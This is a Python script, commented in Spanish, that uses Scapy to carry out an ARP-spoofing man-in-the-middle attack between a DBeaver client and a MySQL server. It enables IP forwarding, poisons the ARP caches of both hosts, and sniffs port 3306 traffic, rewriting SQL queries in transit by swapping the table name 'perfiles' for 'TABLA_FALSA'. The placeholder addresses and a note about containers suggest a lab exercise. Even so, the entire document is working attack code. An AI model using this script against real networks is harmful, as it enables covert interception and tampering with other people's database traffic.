import time
from scapy.all import *
import os
import threading

CLIENTE_IP = "xxx.xxx.xxx.xxx"
SERVIDOR_IP = "xxx.xxx.xxx.xxx"
IFACE = "eth0"

print("--- ATAQUE MAN-IN-THE-MIDDLE CON SCAPY ---")
print(f"[*] Envenenando la red para interceptar comunicacion entre:")
print(f"    CLIENTE (DBeaver): {CLIENTE_IP}")
print(f"    SERVIDOR (MySQL): {SERVIDOR_IP}")
print("-------------------------------------------------")


def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, iface=IFACE, verbose=False)
    if ans:
        return ans[0][1].hwsrc
    print(f"[!] ADVERTENCIA: No se pudo obtener la MAC de {ip}. Asegurate que este contenedor este corriendo y conectado a la red.")
    return None

def arp_spoof(target_ip, host_ip, stop_event):
    target_mac = get_mac(target_ip)
    if not target_mac: return

    arp_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)

    while not stop_event.is_set():
        send(arp_packet, iface=IFACE, verbose=False)
        time.sleep(2)

    print(f"[*] Deteniendo ARP spoof para {target_ip}")


def process_packet(packet):
    if packet.haslayer(IP) and packet.haslayer(TCP) and packet.haslayer(Raw):
        if packet[IP].src == CLIENTE_IP and packet[IP].dst == SERVIDOR_IP:
            print(f"\n[C->S] Interceptado paquete de DBeaver a MySQL (puerto {packet[TCP].dport})")
            payload_original = packet[Raw].load
            if b'perfiles' in payload_original:
                print("[!] ATAQUE: Modificando 'perfiles' por 'TABLA_FALSA'")
                nuevo_payload = payload_original.replace(b'perfiles', b'TABLA_FALSA')
                packet[Raw].load = nuevo_payload
                del packet[IP].chksum
                del packet[TCP].chksum
                sendp(packet, iface=IFACE, verbose=False)
                return
            print("[*] Paquete no modificado, reenviando...")
            sendp(packet, iface=IFACE, verbose=False)

        elif packet[IP].src == SERVIDOR_IP and packet[IP].dst == CLIENTE_IP:
            sendp(packet, iface=IFACE, verbose=False)

os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

stop_event = threading.Event()

spoof_servidor_thread = threading.Thread(target=arp_spoof, args=(SERVIDOR_IP, CLIENTE_IP, stop_event))
spoof_cliente_thread = threading.Thread(target=arp_spoof, args=(CLIENTE_IP, SERVIDOR_IP, stop_event))

spoof_servidor_thread.start()
spoof_cliente_thread.start()

print("[*] ARP spoofing iniciado. Escuchando paquetes en el puerto 3306...")
try:
    sniff(iface=IFACE, filter="tcp port 3306", prn=process_packet, store=0, stop_filter=lambda p: stop_event.is_set())
except KeyboardInterrupt:
    print("\n[!] Interrupcion del usuario detectada.")
finally:
    print("[*] Deteniendo ataque y restaurando la red...")
    stop_event.set()
    spoof_servidor_thread.join()
    spoof_cliente_thread.join()
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[*] Ataque finalizado.")
